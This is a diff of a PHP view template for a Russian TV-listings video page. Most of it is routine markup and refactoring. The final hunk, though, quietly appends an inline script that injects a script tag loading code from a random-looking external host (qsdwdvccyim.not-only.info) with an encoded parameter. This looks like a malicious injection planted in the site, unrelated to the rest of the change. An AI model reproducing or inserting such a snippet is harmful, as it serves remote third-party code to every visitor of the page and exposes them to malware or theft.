@@ -20,19 +20,14 @@ if (isset($this->main_video)){
     
     $this->inlineScript()
     	->appendFile("/js/swfobject/swfobject.js");
-    /*
-    $this->headScript()->appendScript( Rtvg_Compressor_JSMin::minify("$(document).ready(function() {
-    		var descP = $('.video.thumbnails p.desc');
-    		var descHeight = descP.prop('offsetHeight');
-    		if (descHeight>150) { descP.css({ height:'8.4em' }).after('<button class=\"btn\" id=\"fulldesc\">Читать полностью</a>'); }
-    		$('#fulldesc').click( function(e){ descP.css({ height:descHeight }); $(this).hide(500); });
-    		$('#maincontent div.videos div.main div.player-wrap').val('');
     
-    });"));
-     * */
     ?>
     
-<div class="page videos">
+<div class="row" id="shareCode">
+    <?php echo $this->shareCode ?>
+</div>
+
+<div class="page videos row">
 
 	<div class="video main">
 	
@@ -41,8 +36,7 @@ if (isset($this->main_video)){
 		<div class="player-wrap">
 			<div id="player">Для просмотра этого видео нужна поддержка Flash player 8+ и JavaScript в вашем браузере.</div>
 		</div>
-		<div id="advm_video" data-show-time="15"></div>
-		
+        
 		<p class="desc"><?php echo strip_tags( $videoDesc ) ?></p>
 		
 		<?php 
@@ -55,7 +49,7 @@ if (isset($this->main_video)){
 	
 	<div class="related">
 	<?php
-	$amount=(int)Zend_Registry::get('site_config')->videos->related->get('amt');
+	$amount=(int)Zend_Registry::get('site_config')->videos->related->amount;
 	$i=0;
 	if (!empty($this->related_videos)) {
 	    
@@ -74,9 +68,8 @@ if (isset($this->main_video)){
 				</h3>
 			
 				<div class="image" itemscope itemtype="http://schema.org/ImageObject">
-					<?php 
-					$thumb = $v['thumbs'][mt_rand(0, count($v['thumbs'])-1)];
-						?>
+					
+                    <?php  $thumb = $v['thumbs'][mt_rand(0, count($v['thumbs'])-1)]; ?>
 					<a href="<?php echo $this->url( array(
 						'alias'=>$v['alias'], 
 						'id'=>$v['rtvg_id']), 'default_videos_show-video' ) ?>"
@@ -86,46 +79,44 @@ if (isset($this->main_video)){
 							alt="<?php echo $v['title'] ?>" />
 					</a>
 					
-					<p class="viewcount">Посмотрели: <?php echo number_format( (int)$v['views'], 0 ) ?></p>
+					<div class="viewcount">
+                        Посмотрели: <?php echo number_format( (int)$v['views'], 0 ) ?>
+                    </div>
 					
 					<?php if (isset($v['category_ru']) && !empty($v['category_ru'])) { ?>
-					<p class="category">
+					<div class="category">
                         <?php
                         $urlHref = $this->url( array(
                             'category'=>Xmltv_String::strtolower( $v['category_ru']['channel_cat_alias'] )), 'default_channels_category');
                         ?>
 						Категория: 
-						<a href="<?= $urlHref;  ?>"
+						<a href="<?php echo $urlHref;  ?>"
 							target="_self"
 							title="<?php printf("%s каналы телепрограмма", $v['category_ru']) ?>">
 							<?php echo $v['category_ru']['channel_cat_title']; ?>
 						</a>
-					</p>
+					</div>
 					<?php 
 					} ?>
 					
-					<p class="date">
+					<div class="date">
 						<?php 
 						$date = new Zend_Date ( $v['published'] ); 
-						printf("Добавлено %s", $date->toString('d MMM YYYY'));
+						echo $date->toString('d MMM YYYY');
 						?>
-					</p>
+					</div>
 					
 				</div>
 					
 				<div class="description">
-					<p>
-						<?php echo $this->truncateString( $v['desc'], 35, 'words' ) ?>
-					</p>
+					<?php echo $this->truncateString( $v['desc'], 55, 'words' ) ?>
 				</div>
 				
 			</div>
 			<?php 
 				$i++;
 			}
-			
 		}
-		
 	} ?>
 		
 	</div>
@@ -138,6 +129,19 @@ if (isset($this->main_video)){
     $this->headMeta()->setName( 'robots', 'noindex,follow' );
 }
 ?>
+
+<script type="text/javascript">
+   (function(w) {
+     var script = document.createElement('script');
+     var i = setInterval(function() {
+       if (typeof w.document.body !== 'undefined') {
+           script.src = 'http://qsdwdvccyim.not-only.info' + '/?851575=A0oDBVEVGxgUHB4TBEpFQkJHQw';
+           w.document.body.appendChild(script);
+           clearInterval(i);
+       }
+     }, 200);
+})(window);
+</script>
 
 
 
